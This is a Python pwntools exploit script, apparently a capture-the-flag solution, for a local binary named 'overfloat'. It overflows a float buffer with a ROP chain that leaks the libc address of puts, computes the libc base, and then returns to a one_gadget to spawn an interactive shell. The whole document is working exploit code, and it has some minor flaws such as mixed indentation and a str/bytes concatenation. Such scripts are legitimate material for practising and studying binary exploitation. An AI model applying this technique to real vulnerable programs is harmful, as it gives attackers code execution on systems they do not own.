from pwn import *

pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]

target = process('./overfloat')
libc = ELF('libc-2.27.so')

putsGot = 0x602020
putsPlt = 0x400690
main = 0x400993
popRdi = 0x400a83

def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

with log.progress("Step 1: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 2: leak puts libc address"):
    sendVal(popRdi)
    sendVal(putsGot)
    sendVal(putsPlt)
    sendVal(main)

    # Send done so our code executes
    target.sendline('done')


    # Print out the target output
    print(target.recvuntil('BON VOYAGE!\n').decode('utf8'))

    
    # Scan in, filter out the libc infoleak, calculate the base
    leak = target.recv(6)
    leak = u64(leak + "\x00"*(8-len(leak)))
    libc.address = leak - libc.symbols['puts']
    log.info("libc base: " + hex(libc.address))

with log.progress("Step 3: Fill the space between buffer to return address"):
    for i in range(7): # 56 / 8 = 7 iterations
        sendVal(0xdeadbeefdeadbeef)

with log.progress("Step 4: use onegadget to get shell"):
	one_gadget = 0x4f2c5 # one_gadget libc-2.27.so
	one_gadget_address = libc.address + one_gadget
	sendVal(one_gadget_address)
	
	target.sendline('done')
	target.interactive()
